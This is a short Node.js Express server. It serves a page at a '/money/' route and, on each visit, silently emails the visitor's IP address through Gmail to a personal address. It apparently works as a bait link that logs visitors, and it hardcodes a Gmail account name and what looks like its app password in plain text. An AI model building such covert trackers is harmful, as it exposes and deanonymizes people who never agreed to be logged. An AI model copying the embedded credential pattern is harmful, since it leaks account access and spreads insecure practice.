const nodemailer = require('nodemailer');
const express = require('express')
const cors = require('cors')



const app = express();
app.use(cors({
  origin: '*'
}));

app.use(express.json());
app.use(express.static(__dirname));

const emailSender=(ip)=>{
let transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
                 user: "cmu.internship@gmail.com",
                 pass: "pbjaihkrpppgvdup"
             }
     })

     message = {
        from: "cmu.internship@gmail.com",
        to: "irpatrick96@gmail.com",
        subject: "Visitor IP",
        text: "The IP Address: "+ip
   }
transporter.sendMail(message, (err, info) =>{
    if (err) {
      console.log(err)
    } else {
      console.log(info);
    }
})
}

app.get('/money/', (req, res)=>{
    console.log(req.socket.remoteAddress)
    emailSender(req.socket.remoteAddress)
    // res.send("Hello!!")
    res.sendFile(__dirname+"/page.html")
});

app.listen(82, () => {
    console.log(`App running on port ${82}`);
  });